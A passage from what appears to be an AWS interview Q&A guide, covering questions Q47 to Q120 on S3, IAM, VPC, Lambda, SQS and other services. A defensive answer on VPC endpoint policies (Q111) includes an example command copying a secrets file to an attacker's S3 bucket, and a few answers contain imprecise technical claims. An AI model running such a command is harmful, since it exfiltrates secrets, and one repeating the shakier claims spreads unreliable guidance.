- **AWS Config** — records the state of your resources over time. "What does my infrastructure look like?" What was the Security Group configuration on Jan 1st?

Config continuously records resource configurations and changes. You can query: "Show me the configuration of this S3 bucket 30 days ago."

Config Rules let you define compliance checks: "All S3 buckets must have encryption enabled." Config evaluates and marks non-compliant resources.

Use both together for full audit trail: Config for state, CloudTrail for actions.

---

**Q47-Q100 — Rapid-fire AWS Scenarios**

**Q47. [L1]** Your S3 bucket website shows 403 Forbidden. **Answer:** Static website hosting requires public read. Either make bucket public (then enable static hosting) or use CloudFront with Origin Access Control (OAC) — better.

**Q48. [L2]** Lambda function needs to access RDS in a private subnet. **Answer:** Put the Lambda function in the same VPC and private subnet. Add the Lambda's SG to the RDS inbound rules on DB port.

**Q49. [L2]** EC2 instance in private subnet needs to call AWS APIs (e.g., S3, SSM). How without NAT Gateway? **Answer:** Use **VPC Endpoints** — Interface Endpoints or Gateway Endpoints for S3 and DynamoDB. Traffic stays within AWS network. Cheaper than NAT.

**Q50. [L3]** Design a multi-region active-active architecture. **Answer:** Route 53 with latency-based or geolocation routing. Application in both regions. Aurora Global Database (primary in one region, read replicas globally, RPO < 1s). S3 cross-region replication. DynamoDB Global Tables.

**Q51. [L2]** An S3 lifecycle rule is not transitioning objects as expected. **Answer:** Objects must be > 128KB for lifecycle transition to Glacier to apply. Also check the prefix filter matches your objects.

**Q52. [L2]** CloudFormation stack update is failing and rolling back. **Answer:** Check CloudFormation events in console for the failure reason. Common: IAM permissions, resource limit, invalid property value. Fix the template, then redeploy.

**Q53. [L3]** How do you implement blue-green deployments on ECS? **Answer:** Use CodeDeploy with ECS blue/green. Two target groups (blue=current, green=new). CodeDeploy shifts traffic gradually from blue to green. Auto-rollback if CloudWatch alarms trigger.

**Q54. [L2]** SQS queue is growing (consumer can't keep up). **Answer:** Scale out consumer EC2/ECS instances. Use ASG scaled on `ApproximateNumberOfMessagesVisible` CloudWatch metric. Or move to Lambda consumer (auto-scales with queue depth).

**Q55. [L2]** SNS topic notification not being received. **Answer:** Check subscription is confirmed (for email, need to click confirmation link). Check subscription filter policy. Check dead-letter queue for failed deliveries.

**Q56. [L1]** What is the difference between SQS and SNS? **Answer:** SNS = pub/sub, one message to many subscribers (fan-out). SQS = queue, message stored until a consumer reads and deletes it (point-to-point). Combine: SNS fan-out to multiple SQS queues.

**Q57. [L2]** DynamoDB read latency suddenly increased. **Answer:** Check for hot partitions (one partition key getting all traffic). Use DynamoDB Accelerator (DAX) for microsecond read caching. Check consumed Read Capacity Units vs provisioned.

**Q58. [L3]** How do you implement least-privilege access for a microservices application where each service has a different IAM role? **Answer:** Each ECS task or Lambda function has its own IAM role with only the permissions it needs. Use task IAM roles for ECS, execution roles for Lambda. Never share roles between services.

**Q59. [L2]** CloudFront is serving stale content after you updated S3. **Answer:** Invalidate the CloudFront cache: `aws cloudfront create-invalidation --distribution-id <id> --paths "/*"`. Or use cache-control headers and versioned file names to prevent caching issues.

**Q60. [L3]** Design an event-driven architecture for image processing (upload → resize → store). **Answer:** S3 upload → S3 Event Notification → SQS queue → Lambda consumer reads from SQS → resizes image → stores to output S3 bucket → SNS notification to user.

**Q61. [L2]** Route 53 health check is failing for your endpoint but the endpoint seems fine. **Answer:** Route 53 health checks come from specific IP ranges. Ensure Security Group/firewall allows those IPs. Check the health check protocol (HTTP vs HTTPS) and the expected response code.

**Q62. [L2]** You need to run a containerized batch job once per day on AWS. What's the simplest approach? **Answer:** ECS Scheduled Tasks — set a cron expression on the ECS task. ECS runs the Fargate task on schedule and stops it when done.

**Q63. [L3]** How does AWS WAF protect your ALB and what rules would you set up for a web app? **Answer:** WAF inspects HTTP requests before they reach the ALB. Rules: AWS Managed Rule Groups (OWASP top 10, bot control), IP rate limiting (prevent DDoS), geo-blocking, SQL injection detection, XSS detection. Set rules to block or count.

**Q64. [L2]** Your Lambda function is doing the same cold start every invocation because it initializes a big ML model. How do you fix it? **Answer:** Move model loading code to the Lambda initialization phase (outside the handler function). The runtime container is reused between invocations. Use Provisioned Concurrency to pre-warm instances if cold starts are unacceptable.

**Q65. [L2]** You need to store application state for a session-based web app deployed across multiple EC2 instances. Where do you store sessions? **Answer:** ElastiCache Redis — shared in-memory store that all instances can access. Never store sessions in local EC2 memory (breaks when an instance is replaced) or in cookies (security risk for sensitive data).

**Q66. [L2]** What is AWS Systems Manager Parameter Store vs Secrets Manager? **Answer:** Parameter Store = config and non-sensitive parameters. Free tier available. Secrets Manager = specifically for secrets. Auto-rotation built in. Charges per secret. For passwords: use Secrets Manager with auto-rotation. For config: use Parameter Store.

**Q67. [L3]** Your production DB needs a schema migration that could lock tables for minutes. How do you do this with zero downtime? **Answer:** Use a no-lock migration approach: add new column (no lock), backfill data in batches, add new index concurrently, switch app to use new column, drop old column later. For major migrations, use tools like gh-ost (MySQL) or pg_repack (Postgres).

**Q68. [L2]** EC2 instances in an ASG aren't launching due to `InsufficientInstanceCapacity`. **Answer:** Spot capacity issue or that AZ/region is out of that instance type. Mitigate: use multiple instance types in the ASG (mixed instances policy), use multiple AZs, configure capacity rebalancing.

**Q69. [L2]** How do you enable encryption for an existing unencrypted RDS instance? **Answer:** RDS doesn't allow enabling encryption on a running instance. Steps: take a snapshot → copy the snapshot with encryption enabled → restore from encrypted snapshot → update app connection string → delete old instance.

**Q70. [L2]** An application deployed via Elastic Beanstalk needs environment variables. How do you set them? **Answer:** Elastic Beanstalk console → Environment → Configuration → Software → Environment properties. Or via `.ebextensions` files in your code. Or `aws elasticbeanstalk update-environment --option-settings`.

**Q71. [L3]** What is AWS Nitro Enclaves and what problem does it solve? **Answer:** Nitro Enclaves create isolated compute environments within EC2 instances for processing highly sensitive data (cryptographic keys, PII). The enclave has no external network, no persistent storage, and no admin access — even the instance owner can't access enclave memory.

**Q72. [L2]** You're exceeding the 5 VPC limit per region. What do you do? **Answer:** Request a limit increase via AWS Service Quotas. Or redesign to use fewer VPCs with more subnets. Or use a shared VPC (Resource Access Manager) that other accounts attach to.

**Q73. [L2]** How does Auto Scaling determine when to scale in vs scale out? **Answer:** Based on scaling policies: target tracking (maintain metric at target, e.g., 70% CPU), step scaling (scale by N instances when metric crosses threshold), scheduled scaling (scale at specific times). Scale-in has a cooldown period to prevent thrashing.

**Q74. [L3]** You need to query data across multiple AWS accounts using SQL. What service do you use? **Answer:** AWS Athena with Lake Formation for cross-account data access. Or use Amazon Redshift data sharing for analytics. Athena queries S3 data using SQL — set up S3 cross-account access and point Athena at the bucket.

**Q75. [L2]** Your SQS consumer occasionally processes the same message twice. How do you handle this? **Answer:** Implement idempotent consumers — use a message ID to track processed messages (store in DynamoDB). If already processed, skip. Also: use SQS FIFO queues for exactly-once processing (within a message group).

**Q76. [L2]** What is the difference between vertical and horizontal scaling and which does AWS encourage? **Answer:** Vertical = bigger instance. Horizontal = more instances. AWS encourages horizontal (Auto Scaling Groups, ECS/EKS). Vertical is limited (max instance size) and requires downtime. Horizontal is theoretically unlimited and can be automated.

**Q77. [L3]** How would you implement a zero-trust network architecture in AWS? **Answer:** Remove all implicit trust. Use: IAM everywhere (not network location), security groups per-service (not per-subnet), mutual TLS between services, VPC endpoints instead of internet, AWS PrivateLink for inter-service, GuardDuty + Security Hub for continuous threat detection, AWS Verified Access for user-to-app access without VPN.

**Q78. [L2]** A CloudFormation stack is in `UPDATE_ROLLBACK_FAILED` state. How do you recover? **Answer:** Use `continue-update-rollback` API. It lets you specify resources to skip during rollback so the rollback can complete. After rollback completes, investigate and fix the underlying issue.

**Q79. [L2]** How do you prevent accidental deletion of an S3 bucket with important data? **Answer:** Enable S3 Versioning + MFA Delete. Enable S3 Object Lock (WORM). Use a bucket policy with Deny for `s3:DeleteBucket`. Enable AWS Config rule that alerts on deletion attempts.

**Q80. [L3]** You need to implement a DR (Disaster Recovery) strategy for a business-critical app on AWS. Walk me through options. **Answer:** Options by RPO/RTO: Backup & Restore (hours RPO/RTO, cheapest) → Pilot Light (critical infra always on, warm data, minutes to hours) → Warm Standby (scaled-down copy always running, minutes) → Multi-Site Active-Active (near-zero RPO/RTO, most expensive). Choose based on cost vs business SLA.

**Q81. [L2]** What is AWS GuardDuty? **Answer:** Intelligent threat detection service. Analyzes CloudTrail, VPC Flow Logs, DNS logs. Detects: compromised instances communicating with malware C&C, credential theft, Bitcoin mining, unusual API calls from unusual geos. Enable in all regions, integrate with Security Hub.

**Q82. [L2]** An EC2 instance is making unexpected outbound connections to unknown IPs. What do you do? **Answer:** 1) Isolate: change security group to block all outbound. 2) Take a snapshot (forensics). 3) Check VPC Flow Logs for the outbound connections. 4) Check GuardDuty findings. 5) Check running processes on instance. Likely compromised. Don't just terminate — preserve evidence first.

**Q83. [L3]** How does AWS KMS work and when would you use customer-managed keys vs AWS-managed keys? **Answer:** KMS generates and stores encryption keys. You never handle raw key material. AWS-managed keys: automatic rotation, free, no management needed — use for basic encryption. Customer-managed keys: you control rotation, key policy, who can use the key — required when: you need cross-account access, specific compliance requirements, need to disable/delete the key.

**Q84. [L2]** What is Amazon EventBridge and how does it differ from SNS? **Answer:** EventBridge = event bus that routes events from AWS services (EC2, S3, CodePipeline) and custom apps to Lambda, SQS, SNS, Step Functions. Content-based routing (route based on event fields). SNS = simple pub/sub, filter by attributes. EventBridge is richer — 100+ AWS service integrations, schema registry, event replay.

**Q85. [L2]** You want to run your application in multiple AWS regions. What data challenges do you face? **Answer:** Data consistency (cross-region replication has latency), data sovereignty (some data can't leave specific regions), cost (cross-region data transfer fees), conflict resolution for active-active writes. Solutions: DynamoDB Global Tables (multi-master), Aurora Global Database (read-only replica regions), S3 Cross-Region Replication.

**Q86. [L3]** Design a serverless data pipeline for ingesting 1M events per day. **Answer:** API Gateway or Kinesis Data Streams (ingestion) → Kinesis Firehose (buffer/batch) → S3 (raw data lake) → Glue crawler (schema discovery) → Athena (query) → QuickSight (visualization). For real-time processing: Kinesis Data Analytics or Lambda.

**Q87. [L2]** What is the difference between Kinesis Data Streams and SQS? **Answer:** Kinesis: ordered stream, multiple consumers can read same data, data retained 24h-365 days, good for analytics and fan-out. SQS: queue, message deleted after consumed, at-least-once delivery, simpler programming model, good for decoupling services. Use Kinesis for streaming analytics, SQS for task queues.

**Q88. [L2]** An ECS service task is running but the ALB shows it as unhealthy. **Answer:** Check ECS task security group allows ALB security group on the container port. Check the health check path returns 200 on that port. Check task is fully started (health check grace period too short?).

**Q89. [L3]** How do you implement infrastructure drift detection? **Answer:** AWS Config continuous compliance — detects when actual resource state drifts from desired. CloudFormation Drift Detection — compares stack with deployed resources. Terraform plan in CI — `terraform plan` in a scheduled job shows drift. Set up alerts to notify when drift is detected.

**Q90. [L2]** You're getting throttled on AWS API calls. How do you fix it? **Answer:** Implement exponential backoff with jitter in API retry logic. Use AWS SDK built-in retry (most SDKs have this). Reduce polling frequency. Request limit increase via Service Quotas for critical APIs. Batch operations where possible (batch writes to DynamoDB, batch calls to CloudWatch).

**Q91. [L2]** What is Amazon Inspector and when would you use it? **Answer:** Automated security vulnerability assessment for EC2 and ECR. Scans OS packages and app libraries for CVEs. Integrates with Security Hub. Use for: continuous vulnerability scanning of running instances, container image scanning before deployment, compliance reporting.

**Q92. [L3]** How does AWS handle availability zones and how should you design for AZ failure? **Answer:** Each AZ is a physically separate data center (separate power, cooling, networking). AZs in same region connected via low-latency links. Design: deploy in min 2 AZs (preferably 3). Use Multi-AZ RDS. Use ALB (automatically multi-AZ). Use ECS/ASG with instances spread across AZs. Don't use AZ-specific resources for critical state.

**Q93. [L2]** What is AWS Trusted Advisor and what does it check? **Answer:** Recommends best practices across: Cost Optimization (idle resources, unused RIs), Security (open SGs, IAM best practices), Fault Tolerance (Multi-AZ, backups), Performance (underutilized instances), Service Limits. Free tier has limited checks. Business/Enterprise support gets all checks.

**Q94. [L2]** How do you rotate an RDS database password without downtime? **Answer:** Use AWS Secrets Manager. It stores the password and has a rotation Lambda function that: generates new password, updates it in RDS, updates the secret value. Your app retrieves the password from Secrets Manager (not hardcoded). During rotation, there's a brief period where both old and new passwords work (RDS supports this). Zero downtime.

**Q95. [L3]** What is Service Control Policy (SCP) in AWS Organizations and how is it different from an IAM policy? **Answer:** SCP is a guardrail for entire AWS accounts in an Organization. It restricts what IAM policies in those accounts can allow. If SCP doesn't allow an action, no IAM policy in that account can grant it. SCPs don't grant permissions — they limit the maximum permissions. Use: prevent any account from leaving the org, prevent specific regions from being used, enforce tagging requirements.

**Q96. [L2]** How do you set up cross-account logging where all AWS accounts in your org send logs to a central security account? **Answer:** In each account: create CloudTrail and send to S3 in the security account. Update the security account S3 bucket policy to allow PutObject from all org accounts. Or use CloudTrail Organization Trail — one trail covers all accounts in the org automatically.

**Q97. [L2]** Your application is making too many calls to AWS Secrets Manager and you're being charged heavily. How do you reduce this? **Answer:** Cache the secret in application memory (most secrets don't change frequently). AWS Secrets Manager SDK supports caching. Or use Parameter Store (cheaper) for non-rotating secrets. Set an appropriate cache TTL that balances freshness with cost.

**Q98. [L3]** What is AWS PrivateLink and how does it differ from VPC Peering? **Answer:** PrivateLink: exposes a specific service (not a whole network) from one VPC to another. Traffic goes through AWS backbone. Supports cross-account and even cross-org. No routing conflicts, no overlapping CIDR issues. VPC Peering: connects two entire VPCs. All resources in both VPCs can communicate. More permissive, simpler for full VPC connectivity.

**Q99. [L2]** Your CloudFormation deployment is taking too long. How do you speed it up? **Answer:** Parallelize independent resources (CFN does this automatically). Use nested stacks to update only changed stacks. Use ChangeSets to preview changes before applying. For complex stacks: CDK or SAM can generate more efficient templates. For ECS deployments: minimize health check wait times.

**Q100. [L3]** How would you design a system to handle 100,000 concurrent WebSocket connections on AWS? **Answer:** Use API Gateway WebSocket API (scales automatically, no infra to manage). Each connection triggers Lambda functions for connect/disconnect/message. Store connection IDs in DynamoDB. To broadcast: scan DynamoDB for connection IDs, call `@connections` endpoint for each. Use DynamoDB Streams + Lambda for fan-out. For >100k: consider using an ALB with ECS (NLB supports WebSockets with sticky sessions at high scale).

---

**Q101. [L2] A developer needs to temporarily get a shell inside a running Fargate container in a private subnet with absolutely no inbound SSH access. How do you facilitate this securely?**

> *What the interviewer is testing:* ECS Exec, AWS Systems Manager (SSM) Session Manager.

**Answer:**
You would use **ECS Exec** (which is powered by AWS Systems Manager Session Manager under the hood).
1. Ensure the ECS Task Role has the required SSM permissions (`ssmmessages:CreateControlChannel`, etc.).
2. Update the ECS Service or Task definition to explicitly enable `EnableExecuteCommand: true`.
3. The developer uses the AWS CLI to run: `aws ecs execute-command --cluster <cluster> --task <task_id> --container <app> --interactive --command "/bin/sh"`.
This opens a secure, audited websocket tunnel directly into the container. There are no SSH keys to manage, no inbound ports need to be opened on the Security Group, and every shell command typed is fully logged to CloudWatch/CloudTrail.

---

**Q102. [L3] A team in AWS Account A is writing data to an S3 bucket in Account B. Account B explicitly grants them `s3:PutObject` in the bucket policy. However, when Account B administrators try to read the files, they get `Access Denied`. Why, and how is it fixed?**

> *What the interviewer is testing:* Cross-account S3 Object Ownership.

**Answer:**
Historically, in S3, the AWS account that uploads the object retains explicit ownership and full control of that object, even if the bucket itself belongs to a different account. Because Account A uploaded the file, Account A owns it, and Account B (the bucket owner) is locked out unless Account A explicitly grants them read ACLs during the upload (`--acl bucket-owner-full-control`).
*The Modern Fix:* In Account B, go to the S3 bucket settings and enable **S3 Object Ownership: Bucket owner enforced**. This entirely disables all legacy ACLs. The bucket owner (Account B) automatically and forcefully assumes ownership of every file uploaded to the bucket, instantly restoring their read access.

---

**Q103. [L2] You are deploying an API Gateway mapped to a custom domain name natively in the `eu-west-1` (Ireland) region. You request a free ACM (AWS Certificate Manager) SSL certificate in `eu-west-1`, but API Gateway absolutely refuses to let you select it from the dropdown. Why?**

> *What the interviewer is testing:* Edge-optimized APIs vs Regional APIs, ACM region constraints.

**Answer:**
This happens because you selected an **Edge-Optimized** API Gateway endpoint.
Edge-optimized endpoints are actually deployed globally onto the CloudFront Content Delivery Network (CDN) edge locations. CloudFront strictly mandates that all ACM SSL certificates must reside exclusively in the **`us-east-1` (N. Virginia)** region, regardless of where the underlying API Gateway actually lives.
*Fix:* Either request a new ACM certificate in `us-east-1` and attach it, or change the API Gateway endpoint type from "Edge-Optimized" to "Regional", which will natively accept the existing `eu-west-1` certificate.

---

**Q104. [L1] In Amazon Route 53, what is the critical architectural difference between a standard DNS `CNAME` record and an AWS `Alias` record?**

> *What the interviewer is testing:* Route 53 proprietary features, Zone Apex limitations.

**Answer:**
A **CNAME (Canonical Name)** essentially maps one domain to another domain. However, the strict global DNS protocol absolutely forbids a CNAME from being placed at the "Zone Apex" (the naked root domain, e.g., `company.com`).
An **Alias Record** is an AWS-specific proprietary extension that acts like a CNAME but resolves under the hood directly to an IP address. 
1. **Zone Apex:** You *can* place an Alias record at the root domain (`company.com`) to seamlessly point to an ALB or CloudFront distribution.
2. **Cost & Speed:** Alias records to AWS resources are completely free of charge in Route 53 and resolve faster natively within the AWS network.

---

**Q105. [L2] You migrate an application from a traditional RDS instance to Aurora Serverless v2. During a sudden 10x traffic spike, the database scales up successfully, but the application crashes heavily citing "Too many connections." Why didn't Aurora solve the connection limits?**

> *What the interviewer is testing:* Compute scaling vs TCP connection limits.

**Answer:**
Aurora Serverless v2 dynamically scales compute (CPU and RAM) via ACUs (Aurora Capacity Units) in milliseconds. However, it scales the *underlying instance size*. It does not act as a TCP connection multiplexer.
When traffic spikes 10x, the application spawns 10x more active TCP connections to the database. Even though the database has the CPU to handle the queries, the raw connection pool limit was breached before the engine could scale up enough to accommodate the new `max_connections` parameter limit.
*Fix:* Serverless databases must always be paired with a connection pooler like **Amazon RDS Proxy** to efficiently queue and multiplex the massive influx of microservice TCP connections into a small, steady pool of long-lived database connections.

---

**Q106. [L2] To secure an S3 bucket powering a static website, you put CloudFront in front of it. How do you strictly guarantee that users can never bypass CloudFront and access the S3 bucket directly via its public URL?**

> *What the interviewer is testing:* Origin Access Control (OAC), S3 Bucket Policies.

**Answer:**
You must implement **Origin Access Control (OAC)** (the modern replacement for Origin Access Identity, OAI).
1. Block all Public Access directly on the S3 bucket.
2. In CloudFront, configure the S3 Origin to strictly use an OAC.
3. Update the S3 Bucket Policy to explicitly grant `s3:GetObject` permission strictly to the Principal `cloudfront.amazonaws.com`, utilizing a `Condition` block that enforces `StringEquals: AWS:SourceArn` matching the specific ARN of your CloudFront distribution.
This mathematically guarantees that the bucket will aggressively reject any request that didn't natively originate from your precise CloudFront distribution.

---

**Q107. [L1] An engineer argues that if they upload a file to S3 and immediately trigger a Lambda function to read that file, the Lambda might violently crash with a `404 Not Found` due to S3's "Eventual Consistency". Are they correct?**

> *What the interviewer is testing:* Modern S3 consistency models (Strong Consistency).

**Answer:**
**No.** They are referencing outdated architecture. 
As of December 2020, Amazon S3 provides **Strong Read-After-Write Consistency** automatically for all `PUT` and `DELETE` requests globally. 
If an application uploads a file successfully (receiving an HTTP 200), any subsequent `GET` request, even a millisecond later from a Lambda function, is mathematically guaranteed to see the file. Eventual consistency is no longer an issue in standard S3 operations.

---

**Q108. [L3] Your EC2 Auto Scaling Group (ASG) dynamically scales down during the night. However, when it terminates an instance, active users downloading large files are abruptly violently disconnected. How do you gracefully drain those connections?**

> *What the interviewer is testing:* ASG Lifecycle Hooks, ALB Deregistration Delay.

**Answer:**
This requires a two-part solution utilizing application load balancing and ASG native hooks:
1. **ALB Deregistration Delay (Connection Draining):** On the ALB Target Group, configure a deregistration delay (e.g., 300 seconds). When the instance is marked for termination, the ALB stops sending *new* requests to it, but keeps the instance alive in a "draining" state allowing active downloads to finish cleanly.
2. **ASG Lifecycle Hooks:** Add a `Terminating` Lifecycle Hook to the ASG. This intercepts the EC2 termination command and puts the instance into a `Terminating:Wait` state. The instance runs a shutdown script to naturally close stateful background workers, flush caches to Redis, and finally sends a `CompleteLifecycleAction` API call to AWS, allowing the instance to securely power off.

---

**Q109. [L2] You have an SQS queue triggering a Lambda function to encode massive video files. Sometimes a video takes 8 minutes to encode. You randomly notice the exact same video being encoded simultaneously by two different Lambda functions. Why?**

> *What the interviewer is testing:* SQS Visibility Timeout.

**Answer:**
The **SQS Visibility Timeout** is misconfigured.
When a Lambda polls SQS, the message doesn't delete immediately; it becomes "invisible" to other consumers for the duration of the Visibility Timeout (default 30 seconds). 
Because the video encode takes 8 minutes, the 30-second timeout expires violently mid-encode. SQS assumes the first Lambda quietly crashed, making the message instantly visible again. A second Lambda picks up the identical message and starts encoding it.
*Fix:* You must increase the SQS Visibility Timeout to be strictly greater than the maximum theoretical runtime of the Lambda function (e.g., set it to 10 minutes, or 600 seconds).

---

**Q110. [L2] To save 70% on compute costs, you heavily adopt EC2 Spot Instances for your stateless batch processing data pipeline. However, AWS can arbitrarily terminate Spot instances when they need capacity back. How can you ensure your batch jobs don't leave databases in a corrupted state when killed?**

> *What the interviewer is testing:* Spot Instance Interruption Notices.

**Answer:**
AWS natively provides a **2-Minute Spot Instance Interruption Notice** before the instance is forcefully terminated.
1. The application or a background daemon must constantly poll the local EC2 Instance Metadata Service (IMDS) at `http://169.254.169.254/latest/meta-data/spot/instance-action` or listen for EventBridge events.
2. When the 2-minute warning appears, the application must immediately stop accepting new batch jobs, gracefully checkpoint its current processing state to DynamoDB/S3, safely roll back incomplete database transactions, and disconnect.

---

**Q111. [L3] An auditor requires that no EC2 instance in a private VPC subnet can exfiltrate data to an unauthorized S3 bucket. You map a VPC Gateway Endpoint to S3. How do you actually enforce the restriction to your specific bucket?**

> *What the interviewer is testing:* VPC Endpoint Policies.

**Answer:**
Creating a VPC Endpoint simply keeps the traffic on the AWS private backbone; it does not secure it inherently. An attacker could still run `aws s3 cp secrets.txt s3://attacker-bucket`.
To enforce security, you must attach a strict **VPC Endpoint Policy** (a resource policy) directly to the VPC Gateway Endpoint. 
The policy must explicitly `Deny` all `s3:PutObject` actions unless the `Resource` ARN exactly matches your authorized corporate bucket (`arn:aws:s3:::my-secure-corporate-bucket/*`). This guarantees that even if a developer inputs credentials for an external AWS account, the VPC network layer will aggressively drop the traffic.

---

**Q112. [L2] You create a DynamoDB table heavily queried by `UserID`. Months later, the business wants to query by `EmailAddress`. You go to add a Local Secondary Index (LSI) but the AWS console firmly prevents you. Why?**

> *What the interviewer is testing:* Global (GSI) vs Local (LSI) Index immutability constraints.

**Answer:**
**Local Secondary Indexes (LSIs)** are deeply embedded into the physical partition layout of the original DynamoDB table (forcing the same Partition Key, but allowing a new Sort Key). Because of this physical constraint, LSIs **must** be created at the exact moment the table is initially created. They are entirely immutable and cannot be added later.
*Fix:* You must instead create a **Global Secondary Index (GSI)**. GSIs are essentially asynchronous replica tables maintained by AWS under the hood. They can be dynamically added or securely deleted at any time with zero downtime to the primary table.

---

**Q113. [L2] Your company uses AWS Organizations. You log in as the absolute overarching Root User of a member account and try to delete a CloudTrail log, but you violently receive an `Access Denied` error. How is the Root User denied permission?**

> *What the interviewer is testing:* Service Control Policies (SCPs) overriding Root.

**Answer:**
This is the immense power of **Service Control Policies (SCPs)** administered from the AWS Organizations Management (Master) account. 
An SCP operates as an invisible, overarching boundary. If an SCP applied at the Organization or OU level possesses an explicit `Deny` for `cloudtrail:DeleteTrail`, it forcefully supersedes everything below it. 
It mathematically strips that permission away from *every* entity inside the member account—expressly including the usually omnipotent Root User and Administrator IAM Roles. Only the supreme administrators of the overarching Management Account can alter the SCP.

---

**Q114. [L3] An application successfully utilizes AWS EFS (Elastic File System) for shared WordPress storage. It performs beautifully for 3 months, then suddenly grinds to a catastrophic halt, dropping to 1 MB/s throughput daily. Why?**

> *What the interviewer is testing:* EFS Burst Credits and Baseline Throughput.

**Answer:**
The application has exhausted its **EFS Burst Credits**. 
By default, EFS operates in "Bursting Throughput" mode. You are constantly awarded credits based purely on how much data you store. If you only store 10 GB of data, your baseline throughput is a microscopic 0.5 MB/s. 
The application was heavily utilizing accrued "Burst" credits (up to 100 MB/s) to mask the low baseline. After 3 months of heavy traffic, the credit bank hit absolute zero. 
*Fix:* Immediately switch the EFS configuration mode from "Bursting" to **Provisioned Throughput** (e.g., paying for a guaranteed 50 MB/s regardless of storage size) or "Elastic Throughput" mode to instantly restore performance.

---

**Q115. [L2] A serverless payment gateway workflow occasionally takes up to 3 days to resolve because it waits heavily for manual human approval. Should you use AWS Step Functions Standard or Express Workflows?**

> *What the interviewer is testing:* Step Function workflow duration limits.

**Answer:**
You must undeniably use **Standard Workflows**.
- **Standard Workflows:** Support extremely long-running, auditable executions that can pause and wait cleanly for up to **1 year**. They are billed per transition, making them perfect for manual human approval steps and long-polling.
- **Express Workflows:** Are designed explicitly for massive, high-volume event processing (thousands per second). Their absolute maximum execution duration is capped violently at **5 minutes**. They would time out instantly in this scenario.

---

**Q116. [L2] You enabled AWS CloudTrail across your organization. However, when you search the logs to find out who uploaded a specific image `logo.png` into an S3 bucket, nothing appears. You only see bucket creation events. Where is the log?**

> *What the interviewer is testing:* Management Events vs Data Events.

**Answer:**
By default, CloudTrail only records **Management Events** (Control Plane actions). These include creating infrastructure (`CreateBucket`, `RunInstances`, `UpdateSecurityGroup`).
It natively ignores **Data Events** (Data Plane actions) like `s3:GetObject`, `s3:PutObject`, or `dynamodb:PutItem` because logging trillions of them would result in astronomical CloudTrail bills. 
To see the `logo.png` upload, you must explicitly edit the CloudTrail configuration and opt-in to paying to record **Data Events** specifically targeting that S3 bucket.

---

**Q117. [L1] In Amazon ECS, what is the exact difference between the "Task Role" and the "Task Execution Role"?**

> *What the interviewer is testing:* IAM segmentation in container orchestration.

**Answer:**
Both roles serve entirely different isolation boundaries:
- **Task Execution Role:** Used entirely by the ECS/Fargate *Agent* (the infrastructure) *before* your code runs. It needs permissions strictly to pull the Docker image from ECR and natively push the container logs up to CloudWatch.
- **Task Role:** Used directly by *Your Application Code* once the container boots up. If your Python script running inside the container needs to read an S3 bucket or query DynamoDB, those precise permissions must reside exclusively on this role.

---

**Q118. [L3] A fleet of 5,000 Lambda functions in a private VPC aggressively scrape data from the public internet. Randomly, hundreds of them begin crashing with bizarre `Connection Timed Out` networking errors, despite the internet destination being perfectly healthy. What AWS bottleneck is occurring?**

> *What the interviewer is testing:* NAT Gateway SNAT Port Exhaustion.

**Answer:**
This is classic **SNAT (Source Network Address Translation) Port Exhaustion** on the NAT Gateway.
A single AWS NAT Gateway utilizes a single public Elastic IP. TCP allows a theoretical maximum of ~65,000 ephemeral outbound ports per IP addressing a single destination. 
When 5,000 highly concurrent Lambda functions open thousands of individual API connections to the exact same external internet API simultaneously, the NAT Gateway completely runs out of ephemeral routing ports. It violently drops any new outbound connection attempts until old ones close.
*Fix:* Heavily deploy multiple NAT Gateways across multiple public subnets and route traffic dynamically to distribute the SNAT allocation, or deploy dedicated NAT instances.

---

**Q119. [L2] You want to ensure that a highly powerful IAM Administrative User can only execute critical API calls if they are physically situated in the corporate headquarters. How do you enforce this natively in IAM?**

> *What the interviewer is testing:* IAM Condition Keys (`aws:SourceIp`).

**Answer:**
You would append a `Condition` block to their overarching IAM Policy (or a global SCP) that heavily restricts authentication based on their explicit IP address.
```json
"Condition": {
    "NotIpAddress": {
        "aws:SourceIp": ["203.0.113.50/32"]
    }
}
```
If the policy is an explicit `Deny` with a `NotIpAddress` condition, any devastating `ec2:Terminate*` or `s3:Delete*` AWS API calls originating from a coffee shop IP address are aggressively rejected by AWS IAM instantly.

---

**Q120. [L2] A data analytics team is migrating from traditional Amazon Redshift DC2 instances to the modern RA3 node types. What massive architectural paradigm shift does RA3 bring that drastically reduces costs?**

> *What the interviewer is testing:* Redshift compute and storage separation.

**Answer:**
Legacy Redshift nodes (like DC2/DS2) tightly coupled Compute and Storage physically onto the single instance. If you strictly needed 50TB of storage, you were forced to aggressively provision and pay for dozens of compute nodes, even if you only ran 3 simple SQL queries a day, wasting immense amounts of money.
**RA3 Nodes** natively introduce the **Separation of Compute and Storage**. Compute instances only hold a small local cache. The vast majority of the 50TB of data is seamlessly offloaded securely into S3 storage. You can now aggressively scale compute solely for the query performance you require independent of your massive data volume, resulting in huge savings.

---

*More AWS scenarios added periodically. PRs welcome.*
